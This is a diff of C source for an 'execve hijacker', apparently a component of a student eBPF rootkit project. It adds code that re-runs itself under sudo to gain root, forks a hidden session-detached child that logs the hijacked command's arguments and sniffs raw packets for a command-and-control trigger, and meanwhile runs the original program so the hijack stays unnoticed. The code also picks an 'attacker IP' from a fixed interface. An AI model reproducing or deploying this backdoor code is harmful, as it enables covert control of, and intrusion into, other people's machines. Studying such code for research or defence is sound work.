@@ -1,3 +1,4 @@
+#define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/types.h>
@@ -15,12 +16,22 @@
 #include <netdb.h>
 #include <netinet/ip.h>
 #include <netinet/tcp.h>
+#include <sys/file.h>
+#include <errno.h>
+#include <syslog.h>
 #include <dlfcn.h>
 #include <sys/timerfd.h>
+#include <ifaddrs.h>
+#include <linux/if_link.h>
 
 #include "lib/RawTCP.h"
 #include "../common/c&c.h"
+#include <linux/bpf.h>
+#include <bpf/bpf.h>
+#include <bpf/libbpf.h>
 
+#define LOCK_FILE "/tmp/rootlog"
+#define DEFAULT_NETWORK_INTERFACE "enp0s3"
 
 int test_time_values_injection(){
 
@@ -59,7 +70,6 @@ int test_time_values_injection(){
 
 
 char* execute_command(char* command){
-
     FILE *fp;
     char* res = calloc(4096, sizeof(char));
     char buf[1024];
@@ -77,10 +87,73 @@ char* execute_command(char* command){
 
     pclose(fp);
     return res;
+}    
+
+
+/**
+ * @brief Improved version of getting local IP
+ * Based on the man page: https://man7.org/linux/man-pages/man3/getifaddrs.3.html
+ * 
+ * @return char* 
+ */
+char* getLocalIpAddress(){
+    char hostbuffer[256];
+    char* IPbuffer = calloc(256, sizeof(char));
+    struct hostent *host_entry;
+    int hostname;
+        
+    struct ifaddrs *ifaddr;
+    int family, s;
+    char host[NI_MAXHOST];
+
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
+        exit(EXIT_FAILURE);
+    }
+
+    /* Walk through linked list, maintaining head pointer so we
+        can free list later. */
+
+    for (struct ifaddrs *ifa = ifaddr; ifa != NULL;ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == NULL)
+            continue;
+
+        family = ifa->ifa_addr->sa_family;
+
+        /* Display interface name and family (including symbolic
+            form of the latter for the common families). */
+
+        //printf("%-8s %s (%d)\n",ifa->ifa_name,(family == AF_PACKET) ? "AF_PACKET" :(family == AF_INET) ? "AF_INET" :(family == AF_INET6) ? "AF_INET6" : "???",family);
+        /* For an AF_INET* interface address, display the address. */
+
+        if (family == AF_INET || family == AF_INET6) {
+            s = getnameinfo(ifa->ifa_addr,
+                    (family == AF_INET) ? sizeof(struct sockaddr_in) :
+                                            sizeof(struct sockaddr_in6),
+                    host, NI_MAXHOST,
+                    NULL, 0, NI_NUMERICHOST);
+            if (s != 0) {
+                printf("getnameinfo() failed: %s\n", gai_strerror(s));
+                exit(EXIT_FAILURE);
+            }
+
+            //printf("\t\taddress: <%s>\n", host);
+            if(strcmp(ifa->ifa_name, DEFAULT_NETWORK_INTERFACE)==0){
+                //Interface we chose
+                printf("Attacker IP selected: %s (%s)\n", ifa->ifa_name, host);
+                strcpy(IPbuffer, host);
+                return IPbuffer;
+            }
+        }
+        
+    }
+
+    freeifaddrs(ifaddr);
+
+    exit(-1);
 }
 
-
-char* getLocalIpAddress(){
+char* getLocalIpAddress_old(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
     struct hostent *host_entry;
@@ -102,46 +175,16 @@ char* getLocalIpAddress(){
   
     return IPbuffer;
 }
+    //test_time_values_injection();
 
-int main(int argc, char* argv[], char *envp[]){
-    printf("Hello world from execve hijacker\n");
-    for(int ii=0; ii<argc; ii++){
-        printf("Argument %i is %s\n", ii, argv[ii]);
-    }
-    
-    test_time_values_injection();
-
+int hijacker_process_routine(int argc, char* argv[], int fd){
+    //Lock the file to indicate we are already into the routine
     time_t rawtime;
     struct tm * timeinfo;
 
     time ( &rawtime );
     timeinfo = localtime ( &rawtime );
     char* timestr = asctime(timeinfo);
-
-
-    if(geteuid() != 0){
-        //We do not have privileges, but we do want them. Let's rerun the program now.
-        char* args[argc+1]; 
-        args[0] = argv[0];
-        for(int ii=0; ii<argc; ii++){
-            args[ii+1] = argv[ii];
-        }
-        if(execve("/usr/bin/sudo", args, envp)<0){
-            perror("Failed to execve()");
-            exit(-1);
-        }
-    }
-
-
-    //We proceed to fork() and exec the original program, whilst also executing the one we 
-    //ordered to execute via the network backdoor
-    //int bpf_map_fd = bpf_map_get_fd_by_id()
-
-    int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
-    if(fd<0){
-        perror("Failed to open log file");
-        //return -1;
-    }
 
     int ii = 0;
     while(*(timestr+ii)!='\0'){
@@ -150,16 +193,19 @@ int main(int argc, char* argv[], char *envp[]){
     }
     write(fd, "\t", 1);
     
-    ii = 0;
-    while(*(argv[0]+ii)!='\0'){
-        write(fd, argv[0]+ii, 1);
-        ii++;
+    for(int jj = 0; jj<argc; jj++){
+        ii = 0;
+        while(*(argv[jj]+ii)!='\0'){
+            write(fd, argv[jj]+ii, 1);
+            ii++;
+        }
+        write(fd, "\t", 1);
     }
 
     write(fd, "\n", 1);
     write(fd, "Sniffing...\n", 13);
     
-
+    printf("Running hijacking process\n");
     packet_t packet = rawsocket_sniff_pattern(CC_PROT_SYN);
     if(packet.ipheader == NULL){
         write(fd, "Failed to open rawsocket\n", 1);
@@ -210,6 +256,88 @@ int main(int argc, char* argv[], char *envp[]){
         }
     }
 
+    flock(fd, LOCK_UN);
     close(fd);
     return 0;
+}
+
+
+int main(int argc, char* argv[], char *envp[]){
+    printf("Hello world from execve hijacker\n");
+    for(int ii=0; ii<argc; ii++){
+        printf("Argument %i is %s\n", ii, argv[ii]);
+    }
+
+    if(geteuid() != 0){
+        //We do not have privileges, but we do want them. Let's rerun the program now.
+        char* args[argc+3]; 
+        args[0] = "sudo";
+        args[1] = "/home/osboxes/TFG/src/helpers/execve_hijack";
+        printf("execve ARGS%i: %s\n", 0, args[0]);
+        printf("execve ARGS%i: %s\n", 1, args[1]);
+        for(int ii=0; ii<argc; ii++){
+            args[ii+2] = argv[ii];
+            printf("execve ARGS%i: %s\n", ii+2, args[ii+2]);
+        }
+        args[argc+2] = NULL;
+        
+        if(execve("/usr/bin/sudo", args, envp)<0){
+            perror("Failed to execve()");
+            exit(-1);
+        }
+        exit(0);
+    }
+
+
+    //We proceed to fork() and exec the original program, whilst also executing the one we 
+    //ordered to execute via the network backdoor
+    pid_t pid = fork();
+
+    if (pid < 0) {
+        perror("Fork failed");
+    }
+    if (pid == 0) {
+        setsid();
+        //Child process
+        printf("I am the child with pid %d\n", (int) getpid());
+
+        //First of all check if the locking log file is locked, which indicates that the backdoor process is already running
+        int fd = open(LOCK_FILE, O_RDWR | O_CREAT | O_TRUNC, 0666);
+        if(fd<0){
+            perror("Failed to open lock file before entering hijacking routine");
+            exit(-1);
+        }
+        if (flock(fd, LOCK_EX|LOCK_NB) == -1) {
+            if (errno == EWOULDBLOCK) {
+                perror("lock file was locked");
+            } else {
+                perror("Error with the lockfile");
+            }
+            exit(-1);
+        }
+        hijacker_process_routine(argc, argv, fd);
+        printf("Child process is exiting\n");
+        exit(0);
+    }
+    //Parent process. Call original hijacked command
+    char* hij_args[argc]; 
+    hij_args[0] = argv[1];
+    syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", 0, hij_args[0]);
+    for(int ii=0; ii<argc-2; ii++){
+        hij_args[ii+1] = argv[ii+2];
+        syslog(LOG_DEBUG, "hijacking ARGS%i: %s\n", ii+1, hij_args[ii+1]);
+    }
+    hij_args[argc-1] = NULL;
+    
+    if(execve(argv[1], hij_args, envp)<0){
+        perror("Failed to execve() originally hijacked process");
+        exit(-1);
+    }
+    
+    wait(NULL);
+    printf("parent process is exiting\n");
+    return(0);
+
+
+    
 }
